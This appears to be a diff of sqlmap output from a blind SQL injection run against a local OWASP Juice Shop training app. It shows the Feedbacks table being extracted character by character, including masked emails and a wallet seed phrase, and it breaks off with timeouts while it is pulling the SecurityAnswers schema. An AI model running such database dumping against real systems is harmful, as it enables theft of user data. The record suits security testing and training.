+[06:27:41] [INFO] retrieved: Never gonna buy anywhere else from now on! Thanks for the great service! (anonymous)
+[06:27:41] [INFO] retrieving the length of query output
+
+[06:27:41] [INFO] retrieved: 30
+[06:27:41] [INFO] retrieved: ______________________________
+[06:27:41] [INFO] retrieved: 
+[06:27:44] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00             
+[06:27:44] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00
+[06:27:44] [INFO] retrieving the length of query output
+
+[06:27:44] [INFO] retrieved: 1
+
+[06:27:44] [INFO] retrieved: 7
+[06:27:44] [INFO] retrieving the length of query output
+
+[06:27:44] [INFO] retrieved: 1
+
+[06:27:44] [INFO] retrieved: 4
+[06:27:44] [INFO] retrieving the length of query output
+
+[06:27:44] [INFO] retrieved: 30
+[06:27:45] [INFO] retrieved: ______________________________
+[06:27:45] [INFO] retrieved: 
+[06:27:47] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00             
+[06:27:47] [INFO] retrieved: 2026-03-04 05:47:22.372 +00:00
+[06:27:47] [INFO] retrieving the length of query output
+
+[06:27:47] [INFO] retrieved:  
+
+[06:27:47] [INFO] retrieved:  
+[06:27:47] [INFO] retrieving the length of query output
+
+[06:27:47] [INFO] retrieved: 34
+[06:27:48] [INFO] retrieved: __________________________________
+[06:27:48] [INFO] retrieved: 
+[06:27:50] [INFO] retrieved: Keep up the good work! (anonymous)             
+[06:27:51] [INFO] retrieved: Keep up the good work! (anonymous)
+[06:27:51] [INFO] retrieving the length of query output
+
+[06:27:51] [INFO] retrieved: 30
+[06:27:51] [INFO] retrieved: ______________________________
+[06:27:51] [INFO] retrieved: 
+[06:27:53] [INFO] retrieved: 2026-03-04 05:47:22.373 +00:00             
+[06:27:53] [INFO] retrieved: 2026-03-04 05:47:22.373 +00:00
+[06:27:53] [INFO] retrieving the length of query output
+
+[06:27:53] [INFO] retrieved: 1
+
+[06:27:54] [INFO] retrieved: 8
+[06:27:54] [INFO] retrieving the length of query output
+
+[06:27:54] [INFO] retrieved: 1
+
+[06:27:54] [INFO] retrieved: 3
+[06:27:54] [INFO] retrieving the length of query output
+
+[06:27:54] [INFO] retrieved: 30
+[06:27:54] [INFO] retrieved: ______________________________
+[06:27:54] [INFO] retrieved: 
+[06:27:57] [INFO] retrieved: 2026-03-04 05:47:22.373 +00:00             
+[06:27:57] [INFO] retrieved: 2026-03-04 05:47:22.373 +00:00
+Database: <current>
+Table: Feedbacks
+[8 entries]
++----+--------+--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+| id | UserId | rating | comment                                                                                                                                                                              | createdAt                      | updatedAt                      |
++----+--------+--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+| 1  | 1      | 5      | I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)                                                                                                     | 2026-03-04 05:47:21.162 +00:00 | 2026-03-04 05:47:21.162 +00:00 |
+| 2  | 2      | 4      | Great shop! Awesome service! (***@juice-sh.op)                                                                                                                                       | 2026-03-04 05:47:21.163 +00:00 | 2026-03-04 05:47:21.163 +00:00 |
+| 3  | 3      | 1      | Nothing useful available here! (***der@juice-sh.op)                                                                                                                                  | 2026-03-04 05:47:21.164 +00:00 | 2026-03-04 05:47:21.164 +00:00 |
+| 4  | 21     | 1      | Please send me the juicy chatbot NFT in my wallet at /juicy-nft : "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch" (***ereum@juice-sh.op)          | 2026-03-04 05:47:21.176 +00:00 | 2026-03-04 05:47:21.176 +00:00 |
+| 5  | NULL   | 2      | Incompetent customer support! Can't even upload photo of broken purchase!<br /><em>Support Team: Sorry, only order confirmation PDFs can be attached to complaints!</em> (anonymous) | 2026-03-04 05:47:22.372 +00:00 | 2026-03-04 05:47:22.372 +00:00 |
+| 6  | NULL   | 4      | This is <b>the</b> store for awesome stuff of all kinds! (anonymous)                                                                                                                 | 2026-03-04 05:47:22.372 +00:00 | 2026-03-04 05:47:22.372 +00:00 |
+| 7  | NULL   | 4      | Never gonna buy anywhere else from now on! Thanks for the great service! (anonymous)                                                                                                 | 2026-03-04 05:47:22.372 +00:00 | 2026-03-04 05:47:22.372 +00:00 |
+| 8  | NULL   | 3      | Keep up the good work! (anonymous)                                                                                                                                                   | 2026-03-04 05:47:22.373 +00:00 | 2026-03-04 05:47:22.373 +00:00 |
++----+--------+--------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------+--------------------------------+
+
+[06:27:57] [INFO] table 'SQLite_masterdb.Feedbacks' dumped to CSV file '/output/localhost/dump/SQLite_masterdb/Feedbacks.csv'
+[06:27:57] [INFO] retrieving the length of query output
+
+[06:27:57] [INFO] retrieved: 257
+[06:27:57] [INFO] retrieved: __________________________________
+[06:27:57] [INFO] retrieved: 
+[06:28:21] [INFO] retrieved: ..L, `updatedAt` DATETIME NOT NULL)               
+[06:28:21] [INFO] retrieved: CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)
+[06:28:21] [INFO] fetching entries for table 'PrivacyRequests'
+[06:28:21] [INFO] fetching number of entries for table 'PrivacyRequests' in database 'SQLite_masterdb'
+
+[06:28:21] [INFO] retrieved: 0
+[06:28:21] [WARNING] table 'PrivacyRequests' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: PrivacyRequests
+[0 entries]
++----+--------+-----------+-----------+-------------------+
+| id | UserId | createdAt | updatedAt | deletionRequested |
++----+--------+-----------+-----------+-------------------+
++----+--------+-----------+-----------+-------------------+
+
+[06:28:21] [INFO] table 'SQLite_masterdb.PrivacyRequests' dumped to CSV file '/output/localhost/dump/SQLite_masterdb/PrivacyRequests.csv'
+[06:28:21] [INFO] retrieving the length of query output
+
+[06:28:21] [INFO] retrieved: 351
+[06:28:21] [INFO] retrieved: __________________________________
+[06:28:21] [INFO] retrieved: [06:29:41] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[06:29:41] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[06:29:49] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[06:29:50] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[06:29:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[06:29:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[06:29:50] [CRITICAL] connection timed out to the target URL
+[06:29:50] [WARNING] unexpected response detected. Will use (extra) validation step in similar cases
+there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
+
+[06:29:50] [INFO] partially retrieved: CREATE TABLE `SecurityAnswers` (`UserId` INTEGER UNIQUE REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `SecurityQuestionId` INTEGER REFERENCES `SecurityQuestions` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER
+[06:29:50] [INFO] fetching entries for table 'SecurityAnswers'
+[06:29:50] [INFO] fetching number of entries for table 'SecurityAnswers' in database 'SQLite_masterdb'
+
+[06:29:50] [INFO] retrieved: [06:29:50] [WARNING] HTTP error codes detected during run:
+401 (Unauthorized) - 8439 times, 500 (Internal Server Error) - 59 times
+[06:29:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/output/results-03042026_0623am.csv'
+
+[*] ending @ 06:29:50 /2026-03-04/
+
